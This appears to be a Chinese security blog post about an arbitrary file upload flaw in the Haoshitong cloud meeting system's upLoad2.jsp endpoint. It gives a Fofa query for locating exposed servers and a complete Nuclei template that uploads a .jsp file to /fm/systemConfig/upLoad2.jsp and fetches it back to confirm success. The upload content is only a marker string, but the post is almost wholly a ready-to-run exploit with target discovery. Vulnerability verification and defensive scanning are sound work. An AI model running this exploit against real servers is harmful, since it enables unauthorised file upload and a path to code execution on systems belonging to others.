#  好视通云会议upLoad2.jsp文件任意文件上传漏洞   
原创 骇客安全  骇客安全   2025-02-06 16:03  
  
## 漏洞复现  
  
1、Fofa  
  
body="images/common/logina_1.gif"  
  
![](https://mmbiz.qpic.cn/mmbiz_png/IePibcXn991NdhXhotHNkOAUDE04YPV2VODUaiaEXcX046Uj4vYNZFr9Mw4G6pvic4LsQNyhiaZv4PDFfTjVDwhmKg/640?wx_fmt=png&from=appmsg "null")  
  
```
id: haoshitong-fm-upload

info:
  name: haoshitong-fm-upload
  author: m0be1
  severity: critical

variables:
  filename: "{{to_lower(rand_base(5))}}"

http:
  - raw:
    - |
      POST /fm/systemConfig/upLoad2.jsp HTTP/1.1
      Host: {{Hostname}}
      Content-Type: multipart/form-data; boundary=1515df1sdfdsfddfs
      Accept-Encoding: gzip
      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15

      --1515df1sdfdsfddfs
      Content-Disposition: form-data; name="file"; filename="{{filename}}.jsp"
      Content-Type: application/octet-stream

      112
      --1515df1sdfdsfddfs--

    - |
      GET /fm/upload/{{filename}}.jsp HTTP/1.1
      Host: {{Hostname}}
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3
      Accept: */*

    matchers:
      - type: dsl
        dsl:
          - 'status_code==200 && contains_all(body_2,"112")'


```  
  
  
  
